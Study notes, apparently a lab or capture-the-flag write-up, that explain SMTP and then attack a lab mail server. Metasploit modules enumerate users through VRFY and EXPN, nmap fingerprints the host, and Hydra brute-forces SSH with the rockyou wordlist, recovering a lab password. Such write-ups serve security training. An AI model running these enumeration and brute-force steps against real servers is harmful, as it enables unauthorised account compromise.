# SMTP

- What is SMTP:

  - **Simple Mail Transfer Protocol** handles sending emails. To support email services, a protocol pair is required. That;s made up of both SMTP and POP/IMAP. Together, they allow the user to send outgoing mail and retrieve incoming mail respectively.

- What does SMTP do?

  - The SMTP server performs three basic functions
    - it verifies who is sending emails through the SMTP server
    - it sends the outgoing mail
    - if the outgoing mail cant be delivered, it send the message back to the sender.

- What are POP and IMAP
  - **Post Office Protocol** and **Internet Message Access Protocol** are both mail protocols that are responsible for the transfer of email between a client and a mail server.
  - POP is a simplistic approach of downloading the inbox from the mail server to the client
  - IMAP will sync the current inbox with new mail on the server, only downloading what's new.
- How does SMTP work?

  - The user supplies an email, a service will deliver it to the recipients inbox. The role of the SMTP server in this service is to act as the sorting office. The email is sent to this server which then directs it to the recipient.

  User -> SMTP Server -> WWW -> POP / IMAP Server -> Recipient

1. The mail user agent, which is either your email client or an external program. connects to the SMTP server of your domain, e.g. smtp.google.com. This initiates the SMTP handshake. This connection works over the SMTP port- which is usually 25. Once these connections have been made and validated, the SMTP session starts.

2. The process of sending mail can now begin. The client first submits the sender, and recipient's email address- the body of the email and any attachments, to the server.

3. The SMTP server then checks whether the domain name of the recipient and the sender is the same.

4. The SMTP server of the sender will make a connection to the recipient's SMTP server before relaying the email. If the recipient's server can't be accessed, or is not available- the Email gets put into an SMTP queue.

5. Then, the recipient's SMTP server will verify the incoming email. It does this by checking if the domain and user name have been recognised. The server will then forward the email to the POP or IMAP server, as shown in the diagram above.

6. The E-Mail will then show up in the recipient's inbox.

## Enumeration

- Poorly configured mail servers often provide an initial foothold into a network. Prior to launching an attach, we want to fingerprint the server. Here, we will use _smtp_version_, a MetaSploit module.

- The SMTP service has two internal commands that allows us to enumerate users:

  - VRFY: confirm the names of valid users
  - EXPN: reveals actual address of user's aliases and lists of email.
    With using these SMTP commands, we can reveal a list of users.

- We can do this manually over a telnet connection however, Metasploit can also be used. _smtp_enum_ will do the initial work for us.

### MetaSploit

- Drop into the msfconsole
- Search for out exploit _smtp_version_
  ```bash
  msf6> search smtp_version
  ```
- Use the Aux smtp scanner
  ```bash
  msf6 > use auxiliary/scanner/smtp/smtp_version
  ```
- Set the RHOSTS
  ```bash
  set RHOSTS 10.10.x.x
  ```
- Output:

  ```bash
  msf5 auxiliary(scanner/smtp/smtp_version) > exploit

  [+] 10.10.193.219:25      - 10.10.193.219:25 SMTP 220 polosmtp.home ESMTP Postfix (Ubuntu)\x0d\x0a
  [*] 10.10.193.219:25      - Scanned 1 of 1 hosts (100% complete)
  [*] Auxiliary module execution completed
  ```

- _SMTP_ENUM_

  ```bash
  Module options (auxiliary/scanner/smtp/smtp_enum):

  Name       Current Setting                                               Required  Description
  ----       ---------------                                               --------  -----------
  RHOSTS     10.10.152.94                                                  yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
  RPORT      25                                                            yes       The target port (TCP)
  THREADS    1                                                             yes       The number of concurrent threads (max one per host)
  UNIXONLY   true                                                          yes       Skip Microsoft bannered servers when testing unix users
  USER_FILE  /opt/metasploit-framework-5101/data/wordlists/unix_users.txt  yes       The file that contains a list
  of probable users accounts.

  msf5 auxiliary(scanner/smtp/smtp_enum) > set user_file /usr/share/wordlists/SecLists/Usernames/top-usernames-shortli
  st.txt
  user_file => /usr/share/wordlists/SecLists/Usernames/top-usernames-shortlist.txt
  msf5 auxiliary(scanner/smtp/smtp_enum) > run

  [*] 10.10.152.94:25       - 10.10.152.94:25 Banner: 220 polosmtp.home ESMTP Postfix (Ubuntu)
  [+] 10.10.152.94:25       - 10.10.152.94:25 Users found: administrator
  [*] 10.10.152.94:25       - Scanned 1 of 1 hosts (100% complete)
  [*] Auxiliary module execution completed
  ```

## NMAP

```bash
# Nmap 7.60 scan initiated Thu May 13 16:29:09 2021 as: nmap -p 0-1000 -v -sV -sC -A -oN smtp 10.10.152.94
adjust_timeouts2: packet supposedly had rtt of -175494
Nmap scan report for ip-10-10-152-94.eu-west-1.compute.internal (10.10.152.94)
Host is up (0.00044s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 62:a7:03:13:39:08:5a:07:80:1a:e5:27:ee:9b:22:5d (RSA)
|   256 89:d0:40:92:15:09:39:70:17:6e:c5:de:5b:59:ee:cb (ECDSA)
|_  256 56:7c:d0:c4:95:2b:77:dd:53:d6:e6:73:99:24:f6:86 (EdDSA)
25/tcp open  smtp    Postfix smtpd
|_smtp-commands: polosmtp.home, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8,
| ssl-cert: Subject: commonName=polosmtp
| Subject Alternative Name: DNS:polosmtp
| Issuer: commonName=polosmtp
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2020-04-22T18:38:06
| Not valid after:  2030-04-20T18:38:06
| MD5:   5c21 92bb 0da5 82d6 7b45 a851 7651 7137
|_SHA-1: eb6c 0d88 57e6 8ba7 8308 aac8 9c34 0836 d2a1 c133
|_ssl-date: TLS randomness does not represent time
MAC Address: 02:AF:BF:4D:3B:C1 (Unknown)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.60%E=4%D=5/13%OT=22%CT=1%CU=34474%PV=Y%DS=1%DC=D%G=Y%M=02AFBF%T
OS:M=609D45D5%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=10E%TI=Z%CI=Z%TS=A
OS:)SEQ(SP=102%GCD=1%ISR=10E%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M2301ST11NW7%O2=M23
OS:01ST11NW7%O3=M2301NNT11NW7%O4=M2301ST11NW7%O5=M2301ST11NW7%O6=M2301ST11)
OS:WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)ECN(R=Y%DF=Y%T=40%W=
OS:F507%O=M2301NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N
OS:)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0
OS:%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7
OS:(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=
OS:0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Uptime guess: 31.305 days (since Mon Apr 12 09:10:33 2021)
Network Distance: 1 hop
TCP Sequence Prediction: Difficulty=258 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: Host:  polosmtp.home; OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.44 ms ip-10-10-152-94.eu-west-1.compute.internal (10.10.152.94)

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu May 13 16:29:25 2021 -- 1 IP address (1 host up) scanned in 16.17 seconds
```

## Exploitation

- So far, we have collected a few critical pieces of information
  1. the SMTP server version: polosmtp.home ESMTP PostFix
  1. A username: administrator
  1. The only other open port is SSH
- Currently, our only option is to bruteforce the password for the SSH login via Hydra

### Hydra

- Hydra uses dictionary attacks primarily.
  ```bash
  hydra -t 16 -l USERNAME -P /usr/share/wordlists/rockyou.txt -vV 10.10.x.x. ssh
  ```
  | hydra                   | Runs the hydra tool                                          |
  | ----------------------- | ------------------------------------------------------------ | ---------------------------------- |
  | -t 16                   | Number of parallel connections per target                    |
  | -l [user]               | Points to the user who's account you're trying to compromise |
  | -P [path to dictionary] | Points to the file containing the list of possible passwords |
  | -vV                     | Sets verbose mode to very verbose, shows the login           | +pass combination for each attempt |
  | [machine IP]            | The IP address of the target machine                         |
  | ssh / protocol          | Sets the protocol                                            |
- Result

```bash
[22][ssh] host: 10.10.152.94   login: administrator   password: alejandro
```
